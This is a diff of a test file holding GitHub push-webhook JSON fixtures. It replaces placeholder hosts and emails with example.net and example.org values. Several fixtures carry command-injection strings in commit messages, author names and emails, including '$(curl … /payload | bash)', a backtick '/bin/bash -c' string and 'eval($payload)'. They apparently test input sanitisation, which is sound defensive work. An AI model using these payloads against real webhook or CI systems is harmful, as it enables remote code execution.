@@ -43,21 +43,21 @@ Tests:
         "commits": [
           {
             "id": "def456",
-            "message": "Fix bug $(curl evil.com/payload | bash)",
+            "message": "Fix bug $(curl example.net/payload | bash)",
             "timestamp": "2024-01-15T10:30:00Z",
             "url": "https://github.com/org/repo/commit/def456",
             "author": {
               "name": "developer",
-              "email": "peregrin@lotr.com"
+              "email": "example.user12@example.org"
             }
           }
         ],
         "head_commit": {
           "id": "def456",
-          "message": "Fix bug $(curl evil.com/payload | bash)",
+          "message": "Fix bug $(curl example.net/payload | bash)",
           "author": {
             "name": "developer",
-            "email": "peregrin@lotr.com"
+            "email": "example.user12@example.org"
           }
         },
         "repository": {
@@ -80,7 +80,7 @@ Tests:
             "message": "Add new feature",
             "author": {
               "name": "attacker",
-              "email": "`/bin/bash -c 'malicious denethor@lotr.com"
+              "email": "`/bin/bash -c 'malicious example.user01@example.org"
             }
           }
         ],
@@ -89,7 +89,7 @@ Tests:
           "message": "Add new feature",
           "author": {
             "name": "attacker",
-            "email": "john@justice.org"
+            "email": "example.user02@alpha.example.org"
           }
         },
         "repository": {
@@ -111,7 +111,7 @@ Tests:
             "message": "Update documentation",
             "author": {
               "name": "$(echo malicious)",
-              "email": "sam@lotr.com"
+              "email": "example.user13@example.org"
             }
           }
         ],
@@ -131,7 +131,7 @@ Tests:
             "message": "Normal commit",
             "author": {
               "name": "dev1",
-              "email": "frodo@lotr.com"
+              "email": "example.user09@example.org"
             }
           },
           {
@@ -139,7 +139,7 @@ Tests:
             "message": "Update /bin/bash -c 'malicious'",
             "author": {
               "name": "dev2",
-              "email": "aragorn@lotr.com"
+              "email": "example.user14@example.org"
             }
           }
         ],
@@ -148,7 +148,7 @@ Tests:
           "message": "Update /bin/bash -c 'malicious'",
           "author": {
             "name": "dev2",
-            "email": "aragorn@lotr.com"
+            "email": "example.user14@example.org"
           }
         },
         "repository": {
@@ -167,7 +167,7 @@ Tests:
             "message": "Fix authentication bug in login flow",
             "author": {
               "name": "John Doe",
-              "email": "denethor@lotr.com"
+              "email": "example.user01@example.org"
             }
           }
         ],
@@ -176,7 +176,7 @@ Tests:
           "message": "Fix authentication bug in login flow",
           "author": {
             "name": "John Doe",
-            "email": "denethor@lotr.com"
+            "email": "example.user01@example.org"
           }
         },
         "repository": {
@@ -209,7 +209,7 @@ Tests:
             "message": "eval($payload)",
             "author": {
               "name": "attacker",
-              "email": "attacker@evil.com"
+              "email": "attacker@example.net"
             }
           }
         ],
